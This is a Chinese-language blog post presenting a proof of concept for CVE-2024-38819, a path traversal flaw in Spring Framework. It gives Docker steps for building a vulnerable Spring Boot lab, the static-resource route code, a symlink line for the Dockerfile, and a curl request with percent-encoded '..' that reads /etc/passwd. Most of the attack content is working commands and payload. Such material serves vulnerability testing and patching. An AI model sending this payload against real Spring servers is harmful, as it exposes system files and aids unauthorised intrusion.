#  【Poc】-Spring Framework路径遍历漏洞(CVE-2024-38819)   
原创 宬室司阍  埋藏酱油瓶   2024-12-16 05:38  
  
## 【🔔】互联网资料/工具，安全性未知，需要自行研判安全性。  
# CVE-2024-38819: PoC  
> Poc:  
> curl http://localhost:8080/static/link/%2e%2e/etc/passwd  
  
# Poc环境验证  
### 1. 构建镜像  
> doker 镜像（Spring Boot 3.3.4，基于 Spring Framework 6.1.13）  
  
```
cd vuln
docker build -t cve-2024-38819-poc .
```  
### 2. 运行服务  
> 运行容器并将端口 8080 暴露给主机  
  
```
docker run -d -p 8080:8080 --name cve-2024-38819-poc cve-2024-38819-poc
```  
### 3. 运行Poc  
> 运行以下命令执行PoC并确认漏洞  
  
```
curl http://localhost:8080/static/link/%2e%2e/etc/passwd
```  
  
如果攻击成功，就会显示 **/etc/passwd**  
 文件的内容。  
## Explanation  
> 1. 使用以下代码创建 PathTraversalDemoApplication.java 以使用 RouterFunction 和 FileSystemResource 设置静态文件路由：  
  
```
public RouterFunction<ServerResponse> staticResourceRouter() {
    return RouterFunctions.resources("/static/**", new FileSystemResource("/app/static/"));
}
```  
> 1. 将以下命令添加到 Dockerfile 以创建符号链接：  
  
```
RUN ln -s /static /app/static/link
```  
> 1. 创建一个有效负载，利用百分比编码通过符号链接遍历目录。  
  
```
Path: `/static/link/%2e%2e/etc/passwd`
```  
> 1. 使用以下 curl 命令执行PoC并验证攻击是否成功：  
  
```
curl http://localhost:8080/static/link/%2e%2e/etc/passwd
```  
  
如果攻击成功，就会显示 **/etc/passwd**  
 文件的内容。  
## 项目地址  
1. 1.   
【仓库】https://github.com/masa42/CVE-2024-38819-POC  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/aOiar7mEUNlqIeYPL63ftuHYOg5LA6Izamo9VLniaX7pBCa2ATgAoIhOm8DuWwGa17csZQkM3fvZ9vjLCZnI37xA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
